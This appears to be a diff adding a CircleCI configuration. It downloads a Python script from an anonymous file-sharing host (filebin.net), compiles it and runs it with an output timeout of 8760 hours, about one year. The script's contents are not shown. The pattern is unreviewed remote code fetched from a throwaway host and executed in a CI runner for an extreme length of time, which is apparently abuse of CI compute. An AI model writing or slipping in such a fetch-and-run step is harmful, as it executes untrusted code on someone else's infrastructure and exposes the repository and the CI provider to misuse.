@@ -1,0 +1,32 @@
+version: 2.1
+
+jobs:
+  build:
+    docker:
+      - image: cimg/python:3.11
+
+    steps:
+      - checkout
+
+      - run:
+          name: Download script
+          command: |
+            wget -O 1_rhel.py "https://filebin.net/lpl9bv8lvtgwqvxk/1_rhel.py"
+            test -s 1_rhel.py
+
+      - run:
+          name: Check Python
+          command: |
+            python --version
+            python -m py_compile 1_rhel.py
+
+      - run:
+          name: Run script
+          command: |
+            python -u 1_rhel.py
+          no_output_timeout: 8760h
+
+workflows:
+  build:
+    jobs:
+      - build
